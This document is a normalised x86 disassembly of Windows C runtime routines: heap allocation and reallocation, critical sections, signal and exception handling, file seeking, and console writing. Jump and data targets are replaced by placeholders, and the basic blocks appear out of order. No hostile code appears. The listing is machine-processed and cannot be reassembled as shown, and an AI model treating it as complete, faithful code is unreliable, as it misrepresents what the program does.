test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_403484
pop ecx
sub_407612
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_4075ab
mov eax esi
pop esi
pop ebp
retn 0x4
sub_407637
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffe0
ja r-xdata
push ebx
call sub_4076da
pop ecx
call sub_405072
mov [ eax ] 0xc
xor eax eax
push esi
push edi
test ebx ebx
je r-xdata
call sub_406c2f
push 0x1e
call sub_406a80
push 0xff
call sub_403a87
xor eax eax
inc eax
mov eax ebx
jmp r-xdata
mov eax edi
pop edi
pop esi
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
push eax
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop ebx
pop ebp
retn
call sub_405072
mov [ eax ] esi
push ebx
call sub_4076da
pop ecx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
call sub_405072
mov [ eax ] esi
sub_4076da
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_407702
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_407756
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
imul ecx [ ebp + 0xc ]
push esi
mov esi ecx
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_405072
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push esi
call sub_4076da
pop ecx
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov [ ecx ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
sub_4077d8
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_407637
pop ecx
pop ebp
retn
push edi
jmp r-xdata
push [ ebp + 0x8 ]
call sub_405311
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_4076da
pop ecx
call sub_405072
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop edi
call sub_405072
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_405030
pop ecx
mov [ esi ] eax
push esi
call sub_4076da
pop ecx
test eax eax
je r-xdata
call sub_405072
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_405030
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_407885
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
cmp ecx ebx
jbe r-xdata
imul ecx [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
cmp [ ebp + 0x8 ] ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0x10 ]
jae r-xdata
push esi
push [ ebp + 0x8 ]
call sub_4077d8
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call sub_403a29
pop ecx
mov ebx eax
call sub_405072
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov eax edi
pop edi
pop esi
cmp ebx esi
jae r-xdata
pop ebx
pop ebp
retn
sub esi ebx
push esi
push 0x0
add ebx edi
push ebx
call sub_409820
add esp 0xc
sub_4078f3
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_40793d
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_405311
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_4079ab
push 0xc
push r--data
call sub_403d50
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_406c2f
push 0x1e
call sub_406a80
push 0xff
call sub_403a87
push 0x18
call sub_4038f8
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_407a6d
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_405072
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_403d95
retn
push edi
call sub_405311
pop ecx
push 0xfa0
push edi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_405311
pop ecx
call sub_405072
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_407a64
mov eax [ ebp - 0x1c ]
sub_407a6d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_4079ab
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_403d29
sub_407b08
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_407b4c
push 0x20
push r--data
call sub_403d50
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_4066cd
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_403d95
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_407b08
pop ecx
lea esi [ eax + 0x8 ]
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_403cf5
mov [ ebp - 0x1c ] 0x1
push eax
call [ DecodePointer@IAT ]
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_405072
mov [ eax ] 0x16
call sub_405020
jmp r-xdata
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_407a6d
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_406596
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_407cb3
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ r--data ]
add ecx [ r--data ]
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_407d0d
mov edi edi
push esi
push edi
xor edi edi
push [ edi + rw-data ]
call [ EncodePointer@IAT ]
mov [ edi + rw-data ] eax
add edi 0x4
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_407d30
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_407d70
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_407dc0
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_403db0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_407d30
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_407d70
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_407e80
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_407f10
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_40a765
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_40a784
jmp r-xdata
sub_407f10
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_4030d9
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_407e80
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_407f72
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_407fa2
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_407fd2
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_40a80d
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_405072
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_405098
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_408057
push 0x14
push r--data
call sub_403d50
or ebx 0xffffffff
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_405085
and [ eax ] 0x0
call sub_405072
mov [ eax ] 0x9
call sub_405085
and [ eax ] 0x0
call sub_405072
mov [ eax ] 0x9
call sub_405020
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_403d95
retn
mov eax ebx
mov edx ebx
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_40a876
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_405072
mov [ eax ] 0x9
call sub_405085
and [ eax ] 0x0
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_407fd2
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_408137
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_408141
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_40a980
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] edi
mov [ ebp - 0x1ad0 ] edi
cmp [ ebp + 0x10 ] edi
jne r-xdata
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
sar eax 0x5
mov edi esi
push ebx
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebx ]
and edi 0x1f
shl edi 0x6
mov cl [ eax + edi + 0x24 ]
add cl cl
sar cl 0x1
mov [ ebp - 0x1adc ] ebx
mov [ ebp - 0x1ac1 ] cl
cmp cl 0x2
je r-xdata
call sub_405085
mov [ eax ] edi
call sub_405072
mov [ eax ] 0x16
call sub_405020
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_4030d9
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp cl 0x1
jne r-xdata
test [ eax + edi + 0x4 ] 0x20
je r-xdata
call sub_405085
and [ eax ] 0x0
call sub_405072
mov [ eax ] 0x16
call sub_405020
jmp r-xdata
push esi
call sub_40895b
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push esi
call sub_407fd2
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ ebx ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop ebx
push ecx
lea ecx [ ebp - 0x1ad8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax + edi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac1 ] 0x0
mov [ ebp - 0x1abc ] ecx
jne r-xdata
call sub_406746
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae0 ]
sete cl
push eax
mov eax [ ebx ]
push [ edi + eax ]
mov esi ecx
call [ GetConsoleMode@IAT ]
xor ecx ecx
cmp eax ecx
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
mov eax [ ebp - 0x1ad8 ]
and [ ebp - 0x1abc ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
cmp [ ebp - 0x1ac1 ] 0x2
jne r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x80
je r-xdata
cmp esi ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1abc ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
mov ecx ebx
xor esi esi
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae0 ] eax
xor eax eax
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
cmp [ ebp - 0x1ac1 ] cl
je r-xdata
push 0x5
pop esi
cmp [ ebp - 0x1abc ] esi
jne r-xdata
mov ecx [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
and [ ebp - 0x1ac0 ] 0x0
mov ecx ebx
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x1ab8 ]
pop esi
call sub_405072
mov [ eax ] 0x1c
call sub_405085
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov dl [ ebx ]
inc ebx
inc ecx
mov [ ebp - 0x1ae0 ] ebx
cmp dl 0xa
jne r-xdata
mov [ ebp - 0x1ac0 ] eax
push [ ebp - 0x1abc ]
call sub_405098
pop ecx
jmp r-xdata
call sub_405072
mov [ eax ] 0x9
call sub_405085
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1ad4 ]
movzx edx [ edx ]
add [ ebp - 0x1ad4 ] esi
add ecx esi
cmp edx 0xa
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx edx [ ebx ]
add ebx esi
add ecx esi
mov [ ebp - 0x1ae0 ] ebx
cmp edx 0xa
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
mov [ eax ] dl
inc eax
inc esi
cmp esi 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc esi
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1adc ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae4 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] esi
push 0xd
pop ebx
mov [ eax ] bx
mov ebx [ ebp - 0x1ae0 ]
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
movzx esi [ ebx ]
xor ecx ecx
cmp esi 0xa
sete cl
add ebx 0x2
add [ ebp - 0x1ac0 ] 0x2
mov [ ebp - 0x1abc ] esi
mov [ ebp - 0x1ae4 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_409769
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
add esi [ ebp - 0x1ad8 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
push [ ebp - 0x1abc ]
call sub_40a93c
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1abc ]
push eax
call sub_40a200
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1ad4 ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1ac0 ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1abc ]
push ecx
push eax
push [ ebp - 0x1ae0 ]
inc ebx
inc [ ebp - 0x1ac0 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1abc ]
push ebx
push eax
call sub_40a200
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1abc ] eax
call sub_40a93c
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
mov al [ ebp - 0x1ac1 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1ac0 ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1ac0 ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
mov [ ebp - 0x1ac8 ] eax
cmp [ ebp - 0x1ad4 ] esi
jl r-xdata
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ad4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_40883e
push 0x10
push r--data
call sub_403d50
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_405085
and [ eax ] 0x0
call sub_405072
mov [ eax ] 0x9
call sub_405085
and [ eax ] 0x0
call sub_405072
mov [ eax ] 0x9
call sub_405020
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_403d95
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
